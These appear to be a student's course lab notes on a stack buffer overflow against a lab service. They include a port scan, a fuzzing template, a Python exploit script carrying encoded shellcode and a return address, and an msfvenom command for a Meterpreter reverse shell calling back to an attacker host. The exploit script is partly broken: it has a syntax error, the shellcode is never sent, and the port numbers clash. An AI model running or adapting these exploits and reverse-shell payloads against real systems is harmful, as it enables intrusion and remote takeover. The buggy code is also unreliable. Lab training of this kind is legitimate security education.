# Module 2, Lesson 14 – Buffer Overflow Exploit

## 1. Identify the attack surface of the server

```bash
nmap 192.168.229.13 ( found port 313373/tcp open Elite)
nc 192.168.229.13 31337 ("Welcome to the character customizatino server! Type HELP for options")
HELP brings up a list of inputs
```

## 2. Fuzz the server for weaknesses in buffers

[Simple Fuzzer Script](../Mod2L13-Simple-Fuzzer.md#actual-fuzzer-script)

## 3. Develop a proof of concept exploit

```spike
s_readline();
s_string("A");
S_string_variable("NICK")
```

```python
#! /usr/bin/env python3

import socket

ip='192.168.229.13'
port=31337
buff = 'CLASS ' + 'A'*2001 + 'BBBB'*4 + 'C' * (5011 - 11 - 4)

print(buff)

buf =  b""
buf += b"\xb8\x7e\x7d\x29\xf2\xdb\xc4\xd9\x74\x24\xf4\x5b\x33"
buf += b"\xc9\xb1\x59\x83\xeb\xfc\x31\x43\x10\x03\x43\x10\x9c"
buf += b"\x88\xd5\x1a\xef\x73\x26\xdb\x8f\x42\xf4\xbf\xc4\xf7"
buf += b"\xc8\xb4\x88\xfb\xa3\x99\x38\x8d\x51\x12\xf7\xc7\xbf"
buf += b"\x1c\x08\x5c\xcd\x76\xc7\xa3\x9e\xbb\x46\x58\xdd\xef"
buf += b"\xa8\x61\x2e\xe2\xa9\xa6\xf8\x88\x46\x7a\xac\xf9\xca"
buf += b"\x6b\xd9\xbc\xd6\x8a\x0d\xcb\x66\xf5\x28\x0c\x12\x49"
buf += b"\x32\x5d\x51\x09\x14\x0d\xee\xe2\x4c\xac\x23\x77\xa5"
buf += b"\xda\xff\x31\xbd\x17\x74\xc0\x17\x66\x75\xf2\x57\x48"
buf += b"\x46\xf8\xfb\x4a\x9f\x3b\xe4\x38\xeb\x3f\x99\x3a\x28"
buf += b"\x3d\x45\xce\xae\xe5\x0e\x68\x0a\x17\xc2\xef\xd9\x1b"
buf += b"\xaf\x64\x85\x3f\x2e\xa8\xbe\x44\xbb\x4f\x10\xcd\xff"
buf += b"\x6b\xb4\x95\xa4\x12\xed\x73\x0a\x2a\xed\xdc\xf3\x8e"
buf += b"\x66\xce\xe2\xaf\x87\x10\x0b\xf2\x1f\xdc\xc6\x0d\xdf"
buf += b"\x4a\x50\x7d\xed\xd5\xca\xe9\x5d\x9d\xd4\xee\xd4\x89"
buf += b"\xe6\x21\x5e\xd9\x18\xc2\x9e\xf3\xde\x96\xce\x6b\xf6"
buf += b"\x96\x85\x6b\xf7\x42\x33\x66\x6f\xad\x6b\x93\x71\x45"
buf += b"\x69\x5c\x57\x96\xe4\xba\x37\xc9\xa6\x12\xf8\xb9\x06"
buf += b"\xc3\x90\xd3\x89\x3c\x80\xdb\x40\x55\x2b\x34\x3c\x0d"
buf += b"\xc4\xad\x65\xc5\x75\x31\xb0\xa3\xb6\xb9\x30\x53\x78"
buf += b"\x4a\x31\x47\x6d\x2d\xb9\x97\x6e\xd8\xb9\xfd\x6a\x4a"
buf += b"\xee\x69\x71\xab\xd8\x35\x8a\x9e\x5b\x31\x74\x5f\x6d"
buf += b"\x49\x43\xf5\xd1\x25\xac\x19\xd1\xb5\xfa\x73\xd1\xdd"
buf += b"\x5a\x20\x82\xf8\xa4\xfd\xb7\x50\x31\xfe\xe1\x05\x92"
buf += b"\x96\x0f\x73\xd4\x38\xf0\x56\x66\x3e\x0e\x24\x41\xe7"
buf += b"\x66\xd6\xd1\x17\x76\xbc\xd1\x47\x1e\x4b\xfd\x68\xee"
buf += b"\xb4\xd4\x20\x66\x3e\xb9\x83\x17\x3f\x90\x42\x89\x40"
buf += b"\x17\x5f\x3a\x3a\x58\x60\xbb\xbb\x70\x05\xbc\xbb\x7c"
buf += b"\x3b\x81\x6d\x45\x49\xc4\xad\xf2\x42\x73\x93\x53\xc9"
buf += b"\x7b\x87\xa4\xd8"

buff = 'CLASS /.../' + 'A' * 2001 + '\xb1\xf9\x93\x77' + 'BBBB'*4 +'C' (5011 - 11 -4)

with socket.socket() as fuzz:
    fuzz.connect((ip,port))
    fuzz.send(bytes(buff,'latin-1'))


```

## 4. Further develop your exploit to a full shell

```msfvenom
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.229.30 lport=55555 -e x86/shikata_ga_nai -b '\x00' -f python
```

EIP = 7792dc9d

## NOTE: You can choose to do a BIND or REVERSE shell or try both
